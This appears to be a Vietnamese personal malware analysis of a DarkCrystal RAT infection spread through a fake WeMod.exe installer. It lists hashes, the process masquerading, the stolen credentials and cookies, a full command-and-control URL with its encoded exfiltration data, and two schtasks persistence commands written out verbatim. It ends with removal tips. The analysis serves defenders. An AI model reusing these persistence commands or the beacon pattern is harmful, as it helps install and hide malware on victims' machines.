# DarkCrystal RAT Backdoor

| MD5  | Tiến trình bị nhúng |
| ------------- |:-------------:|
| ab89ad40755d6a762bc6edc98f49c434      | [<được nhúng vào word>]    |
| eb7434249ee2fb6f6568821568aeefb8      | [WeMod.exe]     |
| a15410a6d2cc6b4484c870f4332658f2       | [chrome.exe]     |
| ad7fb5d7b838109733a71813872913ee       | ????     |



### Tự sự ( bạn có thể đọc phần chính ở đây )
Dạo một hôm mình đi crack game thì biết đến WeMod.exe chuyển mod các game từ steam mình đang chơi gem đua xe nên cx có ý định tải về để hack tiền và thế mình lọ mọ tải về để dùng ban đầu mình cũng khả nghi rồi nhưng vì tính liều cao nên chạy setup luôn ._. lúc set up xong thì mình thấy máy chạy hơi chậm chậm cảm thấy không giòn nên kiểm tra thì có các tiến trình lạ chạy ngầm và đặc biệt là `WeMod.exe` ( xin vĩnh biệt cụ ). May mà mình nhanh nhẹn dùng chiến thuật rút dây nguồn để ngăn chặn lây lan ==> tiến hành mở máy tính chế độ `safemode` để bem [lưu ý nếu máy bạn có dữ liệu quan trọng nên boot thẳng bản win khác rồi chiến nhé vì sẽ có nhiều loại virut ghi đè hẳn vào system để khởi động cùng safemode]

# Phân tích
 - ### Ngay sau khi chạy virut sẽ tự dump tạo ra 1 tiến trình mới `IMEDICTUPDATE.exe` [nhằm đánh lừa các AV và người dùng vì đây là tiến trình mặc định của `Microsoft Office IME 2010`
  + Ta thấy tiến trình đã đánh cắp `credential data` và `cookie` của trình duyệt ...
  + Sau đó ta thấy nó kết nối tới `CnC server` (một mạng lưới botnet rộng) với `IP:188.120.229.5 PORT:80` đến từ nước nga 
  + > fullurl: http://188.120.229.5/boot/u927/ApiDefaultdownloads.php?PgZvohdH9M6ijfuT12g7tVuvDVte0=nybVvv&evR6XBmkvuVaX7eNbL3vnrTy9R0jIGO=8UWGPAVTILRkXDdLIlAJ1AUw&f203d62a50c81733dd6b494a616e9a29=151a4e97d5c54ea8faace617262bd91b&f537473b824c304d8386d3abb13217a0=gZzYjMmhTMjZmYyI2N5M2Y1gDOiVGZ0ITYmVGOwkjZwIjYwQWMiFzN&PgZvohdH9M6ijfuT12g7tVuvDVte0=nybVvv&evR6XBmkvuVaX7eNbL3vnrTy9R0jIGO=8UWGPAVTILRkXDdLIlAJ1AUw
  
  + >[ ps `ip` này đã được bóc phốt bởi trang này cx từ tiếng nga  ._. https://hosting.black/dcrat-botnet-controller-188-120-229-5/ ]
  + Bằng nghiệp vụ 007 tôi đã decrypt data[._. thật ra chỉ có base64 kèm reverse] chuyển giao và phát hiện nó gửi các dữ liệu lên bao gồm data , ip , quốc gia.... và <span style="color:red"> ĐỊA CHỈ VẬT LÝ, VÂNG TÔI NÓI LẠI LÀ ĐỊA CHỈ THẬT ĐƯỢC TRÍCH TRÊN `maxmind` CỦA TÔI TRÊN BẢN ĐỒ Ạ ;(( amen rip vha 2004-2022</span>
  + #### ==> Từ đây ta biết đây là một loại `RAT` được điều khiển bởi một mạng lưới botnet

- ### Tiếp theo để duy trình tiến trình `RAT` sử dụng các câu lệnh thông qua `schtasks.exe ` nguy trang cho phần `startup [shell:startup]` 

 + `schtasks.exe /create /tn "WeMod" /sc ONLOGON /tr "'C:\MSOCache\All Users\{90140000-006E-040C-0000-0000000FF1CE}-C\1036\WeMod.exe'" /rl HIGHEST /f`
 + ==> tự khởi động với hiệu năng cao nhất khi người dùng đăng nhập vào máy tính
 + `schtasks.exe /create /tn "WeModW" /sc MINUTE /mo 11 /tr "'C:\MSOCache\All Users\{90140000-006E-040C-0000-0000000FF1CE}-C\1036\WeMod.exe'" /rl HIGHEST /f`
 + ==> tự khởi động theo định kỳ sau 11 phút 
 +.....


# Hậu quả
 + Bị kiểm soát máy tính 24/24
 + Bị đánh cắp thông tin quan trọng
 + Hiệu năng máy giảm => giật lag
 + Ngoài ra kẻ xấu có toàn quyền tiêm các `ransomware` khác vào máy nạn nhân
 + Vô số khác .....

# Cách khắc phục
+ Kiểm tra các tiến trình và các tiến trình kết nối mạng lạ và xem xét xoá chúng [cái này dành cho người hiểu biết]
+ Với người dùng có thể khởi động chế độ `safeboot` kèm tải `mbam`  rồi cho tự động scan sau khi scan các bạn có thể xem các file đã được diệt virut quét [lưu ý bài post này không được phần mền diệt virut nào tài chợ]